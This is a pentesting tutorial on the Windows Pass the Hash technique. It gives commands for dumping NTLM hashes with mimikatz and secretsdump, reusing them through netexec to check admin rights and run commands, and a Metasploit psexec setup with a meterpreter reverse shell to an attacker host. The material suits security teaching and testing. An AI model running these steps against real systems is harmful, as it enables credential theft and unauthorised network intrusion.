**Pass the Hash** (PtH) is a post-exploitation technique that allows attackers to authenticate to systems without needing plaintext credentials. Instead, attackers use the **hashed version** of a password directly to access resources. This is possible due to weak authentication protocols, primarily in Windows environments, which validate hashes rather than plaintext passwords.

---

## **Key Concepts**

- **Hash Authentication**: Many Windows services accept NTLM hashes as authentication without verifying the plaintext password.
- **Hash Retrieval**: Hashes are extracted from memory, SAM databases, or network traffic using tools like Mimikatz or secretsdump.
- **Lateral Movement**: Attackers use the retrieved hashes to access additional systems, escalating their control within the network.

--- 

## **Obtain Hashes**

- Extract NTLM hashes from a compromised system using tools like:

```bash
mimikatz sekurlsa::logonpasswords
```

Or dump hashes from the SAM database:

```bash
secretsdump.py <target_user>@<target_ip>
```

## **Use Hashes to authenticate**

#### Using netexec

| Option        | Description                                                |
| ------------- | ---------------------------------------------------------- |
| `<target_ip>` | Target machine's IP address.                               |
| `<username>`  | User account.                                              |
| `<NTLM_hash>` |  Hash (format: `<LM_Hash>:<NT_Hash>` or just `<NT_Hash>`). |

```bash
netexec smb <target_ip> -u <username> -H <NTLM_hash>
```

**Check for Administrative Access**: To see if the hash provides administrative privileges:

```bash
netexec smb <target_ip> -u <username> -H <NTLM_hash> --admin
```

**Execute Commands**: If administrative access is confirmed, you can execute commands:

```bash
netexec smb <target_ip> -u <username> -H <NTLM_hash> -x "whoami"
```

#### Using Metasploit

1. **Search for a Suitable Module**: Use the `psexec` module, which supports NTLM hashes:

```bash
search psexec
use exploit/windows/smb/psexec
```

2. **Configure the Module**: Set the target information and hash:

```bash
set RHOSTS <target_ip>
set SMBUser <username>
set SMBPass <NTLM_hash>
set SMBDomain .
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <attacker_port>
```

3. **Execute the Exploit**: Run the exploit to establish a session:

```bash
exploit
# After a successful session, use `meterpreter` commands to gather information or escalate privileges:
meterpreter > sysinfo
meterpreter > getuid
```